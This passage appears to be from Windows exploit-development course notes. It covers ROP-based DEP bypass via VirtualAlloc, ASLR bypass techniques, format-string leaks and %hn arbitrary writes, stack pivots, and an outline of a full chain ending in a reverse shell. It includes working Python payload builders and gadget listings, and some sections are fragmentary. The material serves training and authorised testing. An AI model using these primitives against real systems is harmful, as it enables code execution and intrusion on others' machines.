  • Each RET pops the next gadget address from the stack
  • Attacker’s data on the stack drives execution through short native instructions
  • Goal: call a Win32 API that marks a memory region executable, then return into shellcode

10.3 Gadget Discovery

  • Enumerate gadgets from non-ASLR modules with rp++ (fast, Windows target) or ropper (Kali, auto-chains)
  • For surgical searches, use pykd to walk a module’s memory for specific byte sequences

10.4 DEP Bypass via VirtualAlloc

  • Canonical bypass: call VirtualAlloc to allocate a fresh PAGE_EXECUTE_READWRITE region
  • Copy shellcode there and return into it
  • ROP chain must arrange all five arguments before the call
  • PUSHAD gadget is the idiomatic way to batch the call frame from registers
import struct

def p(x): return struct.pack("<I", x)

# Target: VirtualAlloc(lpAddress, dwSize, flAllocationType, flProtect)
# Arguments:  0=NULL (auto), 0x201=size, 0x1000=MEM_COMMIT, 0x40=PAGE_EXECUTE_READWRITE

GADGET_POP_EAX  = 0x10015f82   # pop eax; ret
GADGET_POP_EBX  = 0x10022b10   # pop ebx; ret

GADGET_POP_EDX  = 0x1002348f   # pop edx; ret

GADGET_XCHG_EAX_ESP = 0x1003f1a0  # xchg eax, esp; ret  (stack pivot if needed)

# EAX = VirtualAlloc addr, EBX = 0x201 (size), ECX = 0x40 (protect),

11. Bypassing ASLR

  • ASLR randomizes module bases each load
  • Bypass with a non-ASLR module, leak a runtime pointer to recompute the base, or partial overwrite

11.1 ASLR Theory

  • ASLR randomizes module base addresses at each load (system boot or process start)
  • Entropy is limited — about 8 bits on 32-bit Windows 10 — roughly 256 possible positions
  • Brute force is rarely the right answer; more surgical bypasses are standard

11.2 Non-ASLR Modules (Easiest Bypass)

  • If any loaded DLL was built without /DYNAMICBASE, take all addresses from it
  • Simplest and most common path — many older third-party DLLs lack ASLR
  • mona’s modules command tabulates this; compare bases across reboots in lm
!py mona modules    # table: ASLR=True/False per module
lm                  # check whether bases change across reboots
# If ANY loaded module has ASLR=False, use addresses (gadgets, IAT) from that module.
# Many older third-party DLLs and COM objects are compiled without /DYNAMICBASE.

11.3 Information Leaks for ASLR Bypass

  • If every loaded module is ASLR-enabled, leak a runtime pointer
  • Sources: format string, over-read, heap info leak
  • Compute the module base at exploit time and rebase every gadget address
# Example: format string leaks a stack pointer belonging to a module
# The server returns 4 bytes at stack offset N when we send %N$x
# We see: 0x6f2a1234 -- subtract the known offset-within-module (from IDA)
# to get the module base.

def rebase(leaked_addr: int, leak_offset_in_module: int) -> int:
    """Compute module base from a leaked pointer."""
    return leaked_addr - leak_offset_in_module

# Then: gadget_runtime = module_base + (gadget_IDA_addr - IDA_imagebase)
def gadget_addr(base: int, gadget_static: int, imagebase: int = 0x400000) -> int:
    return base + (gadget_static - imagebase)

11.4 Partial Overwrite

  • Overwrite only the low 1–2 bytes of a saved pointer
  • High bytes stay valid (already pointing into the correct module)
  • Useful when null byte terminates overflow before a full 4-byte address
  • Requires target address shares high bytes with original value (same 64 KB or 16 MB aligned region)

12. Format String Attacks

  • When user input reaches a printf-family function as the format string itself
  • Format specifiers read from and write to memory
  • Gives both an info leak (defeats ASLR) and an arbitrary write

12.1 Format String Theory

  • Vulnerability: attacker-controlled data reaches printf-family function as first argument
  • printf(user_input) is exploitable; printf("%s", user_input) is not
  • Probe by sending %x %x %x %x %x %x %x %x — if server reflects hex values, format string injection is confirmed

# Safe pattern:

12.4 Write Primitive with %n (Part II)

  • %n writes the number of bytes printed so far into the address pointed to by the corresponding argument
  • Place target address on the stack, inflate byte count with width specifiers
  • Write 2 bytes at a time with %hn to write any 4-byte value to any writable address
# Strategy: write value V to address A
# - Place A on the stack (it will be the pointer %n reads)
# - Use field-width padding (%Wx) to inflate the printed byte count to V
# - Use %hn twice (two 2-byte writes) to avoid overflow with very large values

def write_dword(addr: int, value: int) -> bytes:
    """Build a format string that writes 'value' to 'addr' via %n."""
    lo = value & 0xFFFF          # lower 2 bytes
    hi = (value >> 16) & 0xFFFF  # upper 2 bytes

    # Place addr (lo half) and addr+2 (hi half) on the stack
    targets = struct.pack("<I", addr) + struct.pack("<I", addr + 2)

    # Calculate padding to reach each target value
    # Assumes targets are at stack offset N (determine experimentally)
    stack_offset_lo = 22   # adjust per target
    stack_offset_hi = 23

    # Build: print (lo) bytes for low half, write %hn, then print more for high half
    already_printed = len(targets)
    pad_lo = (lo - already_printed) % 0x10000
    pad_hi = (hi - lo) % 0x10000

    fmt  = targets
    fmt += f"%{pad_lo}x".encode() if pad_lo > 0 else b""
    fmt += f"%{stack_offset_lo}$hn".encode()
    fmt += f"%{pad_hi}x".encode() if pad_hi > 0 else b""
    fmt += f"%{stack_offset_hi}$hn".encode()
    return fmt

12.6 Stack Pivot for ROP After Format String

  • After overwriting EIP with a gadget, ESP needs to point at your ROP chain
  • Use a stack pivot: XCHG EAX, ESP; RET when EAX points to your chain
  • ADD ESP, N; RET to move into a different region
  • LEA ESP, [EAX+N]; RET for a register-relative redirect

add  esp, 0x200 ; ret   ; move ESP into a different region
lea  esp, [eax+0x8] ; ret  ; set ESP to controlled register + offset
sub  esp, 0x40 ; ret    ; move ESP backward into the buffer

; Technique: ensure EAX or another register points to your ROP chain payload
; Then use XCHG EAX,ESP to redirect the stack there, and the chain executes.

12.7 Getting Code Execution (Full Chain)

  • Combine the leak, write primitive, and ROP chain in a single script
  • Leak a code pointer via %N$x, compute module base
  • Calculate saved-EIP address, write ROP chain start there with %hn
  • Trigger function’s return — ROP chain calls VirtualAlloc/WriteProcessMemory
  • Returns into shellcode
"""
Full format string exploit chain:
1. Send a request that causes the server to log a format string we control.
2. Leak the ASLR offset: send %N$x payloads and identify a code pointer.
3. Compute module base from the leaked pointer.
4. Compute the target address (saved EIP in the logging function's frame).
5. Write our ROP chain address to the saved EIP using %hn write primitive.
6. The next request causes the function to return -> EIP = our ROP chain start.
7. ROP chain calls VirtualAlloc or WriteProcessMemory to mark shellcode executable.
8. ROP chain returns into shellcode -> reverse shell.
"""
def exploit():
